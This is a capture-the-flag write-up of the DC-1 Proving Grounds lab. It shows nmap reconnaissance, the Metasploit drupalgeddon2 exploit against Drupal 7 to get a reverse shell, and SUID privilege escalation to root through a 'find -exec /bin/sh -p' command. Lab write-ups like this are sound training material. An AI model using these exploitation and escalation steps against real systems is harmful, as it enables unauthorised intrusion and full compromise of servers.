---
title: "DC-1"
date: 2024-11-07
draft: false
summary: "Writeup for the DC-1 proving grounds CTF challenge."
tags: ["linux", "suid"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/dc1/cover.webp"
  caption: "DC-1 Proving Grounds Challenge"
  alt: "DC-1 cover"
platform: "Misc"
---

This challenge has 2 flags and require us to capture them both by hacking into the system.
<!--more-->
To access the lab, visit **[proving grounds](https://portal.offsec.com/labs/play)** and download the vpn configuration file. Connect to the vpn using `openvpn <file.ovpn>` and start the machine to get an IP.

## Recon

I performed an **nmap** aggressive scan to find open ports and the services running on them.

```shell
nmap -A -p- TARGET -oN dc1.nmap --min-rate 10000
```

| **Port** | **Service**            |
| -------- | ---------------------- |
| 22       | ssh                    |
| 80       | http                   |
| 111      | rpcbinder              |
| 50881    | *dynamically assigned* |

![](https://cdn.ziomsec.com/dc1/1.webp)

## Initial Foothold

I visited the web application running on port 80 and found a **Drupal** Login page.

![](https://cdn.ziomsec.com/dc1/2.webp)

Since **nmap** was able to identify the version of **Drupal**, I searched **Exploit-DB** to identify exploits. Since there were some listed on **Metasploit**, I could use the **Metasploit Framework** for exploitation.

```shell
$ searchsploit 'drupal 7'
$ msfconsole
> search drupal
```

![](https://cdn.ziomsec.com/dc1/3.webp)

![](https://cdn.ziomsec.com/dc1/4.webp)

I selected the `unix/webapp/drupal_drupalgeddon2` exploit and configured parameters like `RHOSTS` (target), `LHOST` (listener IP). Finally, I ran the exploit and got shell access on the target.

```shell
> set RHOSTS TARGET_IP
> set LHOST KALI_IP
> run
```

![](https://cdn.ziomsec.com/dc1/5.webp)

![](https://cdn.ziomsec.com/dc1/6.webp)

I entered shell mode by typing `shell` and navigated to the `/home` directory to capture the first flag.

![](https://cdn.ziomsec.com/dc1/7.webp)

## Privilege Escalation

I then listed binaries owned by root and with an **SUID** bit and found the **find** command. This was an unusual binary and could be used to spawn a shell as it's owner - root.

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![](https://cdn.ziomsec.com/dc1/8.webp)

I visited **GTFObins** and found a way to escalate my privilege  by exploiting this misconfiguration.
- https://gtfobins.github.io

```shell
find local.txt -exec /bin/sh -p \; -quit
```

![](https://cdn.ziomsec.com/dc1/9.webp)

Finally I captured the final flag from the `/root` directory.

![](https://cdn.ziomsec.com/dc1/10.webp)

## Closure

Here's a short summary of how I pwned **DC-1**:
- I Identified **Drupal 7** to be running through **nmap** scan.
- I found exploits for that particular version on metasploit and used it to get initial access.
- I captured the first flag from the `/home` directory.
- I looked for binaries with suid bit and found the `find` command which seemed strange.
- I searched on **gtfobins** and found a way to exploit this misconfiguration to get **root** access.
- After escalating my privilege, I captured the final flag from `/root` directory.

That's it from my side! Until next time ;)

---